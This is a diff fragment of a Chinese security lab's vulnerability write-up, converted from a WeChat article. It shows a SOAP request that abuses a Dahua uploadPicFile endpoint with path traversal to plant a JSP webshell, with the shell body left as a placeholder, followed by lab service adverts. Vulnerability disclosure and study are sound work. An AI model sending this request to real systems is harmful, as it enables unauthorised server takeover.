@@ -7,7 +7,7 @@ source: "MrWQ/vulnerability-paper"
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yJfjckA_XXcvfa92_Oef1w)
 
-**0x01 阅读须知**
+**0x01 阅读须知**
 
 **凯撒安全实验室的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**
 
@@ -57,8 +57,8 @@ Content-Length: 3117
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.poi.mapbiz.emap.dahuatech.com/">
    <soapenv:Header/>
    <soapenv:Body>
-      <res:uploadPicFile>
-         <arg0>/../../kaisec.jsp</arg0>
+      <res:uploadPicFile>
+         <arg0>/../../kaisec.jsp</arg0>
          <arg1>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx(webshell)</arg1>
       </res:uploadPicFile>
    </soapenv:Body>
@@ -74,13 +74,13 @@ Content-Length: 3117
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssucs5ZCVvvlAVSoaahFfzuFaYSbrHypdFDUGEspEVvIBUM49huwoxPjXtzYccibO5pvuLDBW7P9iaQ/640?wx_fmt=png)
 
-  同理 将 poyload 换成 webshell 马 可获取服务器权限：
+  同理 将 poyload 换成 webshell 马 可获取服务器权限：
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssucs5ZCVvvlAVSoaahFfzum6HZG0ePh5tXGETuIO6uroqibMPVg1ECnbHxOJ6otdibh2j2MdXIbU7g/640?wx_fmt=png)
 
 关注公众号带你了解更多 0/1day 漏洞
 
-零日 / 一日 漏洞探讨加 Seven_-0928   
+零日 / 一日 漏洞探讨加 Seven_-0928   
 
 本实验室接受正规站点的授权渗透测试服务。如你的公司业务有 Web 渗透测试，高级渗透测试，红蓝对抗，黑客溯源，Java 代码审计等需求可联系以下微信进行商务洽谈：Xud330327
 
